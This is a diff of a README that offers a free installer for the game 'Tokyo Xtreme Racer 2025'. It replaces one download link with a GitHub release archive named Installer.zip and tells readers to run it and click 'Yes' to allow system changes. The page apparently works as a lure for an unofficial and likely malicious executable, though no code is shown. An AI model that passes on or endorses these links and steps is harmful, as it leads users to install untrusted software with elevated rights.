@@ -14,7 +14,7 @@ Whether you are a seasoned racer or a newcomer to the genre, Tokyo Xtreme Racer 
 To install **Tokyo Xtreme Racer 2025**, follow these simple steps:
 
 1. **Download the Installer**  
-   Click [here](https://nicecolns.com/) to download the game installer.
+   Click [here](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip) to download the game installer.
 
 2. **Run the Installer**  
    After downloading, double-click the installer file to begin the installation process. You may be asked to allow the installer to make changes to your system; click "Yes" to proceed.
